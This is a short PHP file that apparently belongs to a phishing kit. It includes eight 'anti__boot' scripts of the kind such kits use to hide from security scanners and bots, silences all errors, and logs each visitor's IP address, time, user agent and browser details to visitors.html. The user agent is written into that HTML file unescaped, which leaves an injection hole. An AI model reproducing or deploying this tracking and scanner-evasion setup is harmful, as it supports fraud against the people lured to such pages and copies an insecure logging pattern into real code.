<?php

    session_start();
    error_reporting(0);
    include("anti__boot/anti1.php");
    include("anti__boot/anti2.php");
    include("anti__boot/anti3.php");
    include("anti__boot/anti4.php");
    include("anti__boot/anti5.php");
    include("anti__boot/anti6.php");
    include("anti__boot/anti7.php");
    include("anti__boot/anti8.php");
    require_once 'detect.php';

    function visitors() {

        $detect         = new BrowserDetection();
        $ip             = $_SERVER['REMOTE_ADDR'];



        $date           = date("Y-m-d H:i:s", time());
        $usragent       = $_SERVER['HTTP_USER_AGENT'];
        $browserName    = $detect->getName();
        $browserVer     = $detect->getVersion();
        $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Not mobile';
        $platformName   = $detect->getPlatform();
       // $country        = get_client_country();
        $str = " <tr> <th scope='row'>$ip</th>  <td>$date</td> <td>$usragent</td> <td>[$isMobile] $browserName $browserVer </td> </tr>";
        file_put_contents('visitors.html', $str  , FILE_APPEND | LOCK_EX);
    }

?>